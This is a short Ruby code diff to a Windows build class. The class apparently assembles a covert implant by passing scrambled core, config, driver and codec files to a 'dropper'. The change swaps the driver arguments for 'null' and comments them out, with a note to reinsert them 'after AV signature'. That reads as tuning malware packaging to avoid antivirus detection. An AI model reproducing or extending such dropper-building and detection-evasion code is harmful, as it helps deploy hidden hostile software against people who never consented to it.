@@ -110,7 +110,7 @@ class BuildWindows < Build
     # call the super which will actually do the renaming
     # starting from @outputs and @scrambled
     super
-    
+
   end
 
   def melt(params)
@@ -165,8 +165,12 @@ class BuildWindows < Build
       CrossPlatform.exec path('dropper'), path(@scrambled[:core])+' '+
                                           (bit64 ? path(@scrambled[:core64]) : 'null') +' '+
                                           path(@scrambled[:config])+' '+
-                                          path(@scrambled[:driver])+' '+
-                                          (bit64 ? path(@scrambled[:driver64]) : 'null') +' '+
+
+                                          # TODO: reinsert those after AV signature
+                                          'null'+' '+
+                                          'null'+' '+
+                                          #path(@scrambled[:driver])+' '+
+                                          #(bit64 ? path(@scrambled[:driver64]) : 'null') +' '+
                                           (codec ? path(@scrambled[:codec]) : 'null') +' '+
                                           @scrambled[:dir]+' '+
                                           manifest +' '+
